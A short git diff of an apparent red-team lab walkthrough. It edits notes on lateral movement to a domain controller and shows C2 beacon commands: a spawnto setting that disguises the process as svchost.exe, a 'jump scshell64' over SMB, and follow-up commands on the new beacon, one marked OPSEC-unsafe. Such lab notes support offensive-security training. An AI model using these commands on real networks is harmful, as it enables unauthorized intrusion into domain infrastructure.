@@ -157,7 +157,7 @@ ls \\lon-dc-1\c$
 
 ## Lateral Movement JUMP to Domain Controller    
 
->On Web server with administrator TGT beacon:  
+>On Web server with administrator TGT beacon but the jump originated from LON-WS-1:  
 
 ```
 ak-settings spawnto_x64 C:\Windows\System32\svchost.exe
@@ -168,9 +168,9 @@ jump scshell64 lon-dc-1 smb
 
 >After new beacon appear, interact on new `lon-dc-1` beacon:  
 
-```
+```bash
 getuid
-run hostname
+shell hostname # OPSEC-🔴UNSAFE
 ls c:\
 ```
 
